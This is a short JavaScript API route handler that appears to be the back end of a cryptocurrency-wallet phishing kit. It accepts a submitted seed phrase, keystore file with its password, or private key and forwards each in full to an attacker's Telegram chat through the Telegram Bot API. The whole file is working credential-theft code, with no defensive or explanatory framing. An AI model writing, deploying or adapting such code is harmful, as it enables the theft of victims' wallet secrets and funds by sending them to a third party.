export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end(); // Method Not Allowed
  }

  const { type, phrase, keystore, password, privateKey, walletName } = req.body;

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  let message = `🔐 New Wallet Submission\n`;
  message += `📲 Wallet: ${walletName}\n`;
  message += `📁 Type: ${type}\n`;

  if (type === 'phrase') {
    message += `📝 Phrase:\n${phrase}`;
  } else if (type === 'keystore') {
    message += `🧾 Keystore:\n${keystore}\n\n🔑 Password: ${password}`;
  } else if (type === 'privatekey') {
    message += `🔑 Private Key:\n${privateKey}`;
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const tgResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const responseText = await tgResponse.text();
    if (!tgResponse.ok) {
      return res.status(500).json({ success: false, error: responseText });
    }

    return res.status(200).json({ success: true, response: responseText });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
